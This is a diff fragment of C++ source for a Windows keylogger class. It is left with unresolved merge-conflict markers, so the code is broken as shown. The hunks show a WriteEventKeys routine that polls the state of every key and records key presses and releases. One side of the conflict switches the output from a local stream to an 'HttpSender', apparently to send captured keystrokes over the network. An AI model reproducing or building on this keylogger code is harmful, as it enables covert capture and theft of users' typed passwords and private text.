@@ -13,13 +13,15 @@ KeyLogger::KeyLogger() : _keysState(256, false), _keysIgnored(256, false){
     _keysIgnored[VK_MENU] = true;
 }
 
+<<<<<<< Updated upstream
 void KeyLogger::WriteEventKeys(ostream& buf)
+=======
+void KeyLogger::WriteEventKeys(HttpSender* sender)
+>>>>>>> Stashed changes
 {	
     bool isEn = (LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0))) == 0x409);
     for (int key = 0; key < 255; key++) {
-            //Key down
-
-
+        //Key down
         if (LOWORD(GetAsyncKeyState(key))) {
             if (!_keysState[key]) {
 
@@ -36,8 +38,12 @@ void KeyLogger::WriteEventKeys(ostream& buf)
                     continue;
                 }
 
+<<<<<<< Updated upstream
                 buf << stringKey << " ";
 
+=======
+                *sender << stringKey + "";
+>>>>>>> Stashed changes
 			}
 		}
 		else {
@@ -51,7 +57,11 @@ void KeyLogger::WriteEventKeys(ostream& buf)
                     continue;
                 }
 
+<<<<<<< Updated upstream
                 buf << stringKey << "[UP] ";
+=======
+                *sender << stringKey + "[UP]";
+>>>>>>> Stashed changes
             }
 		}
 	}
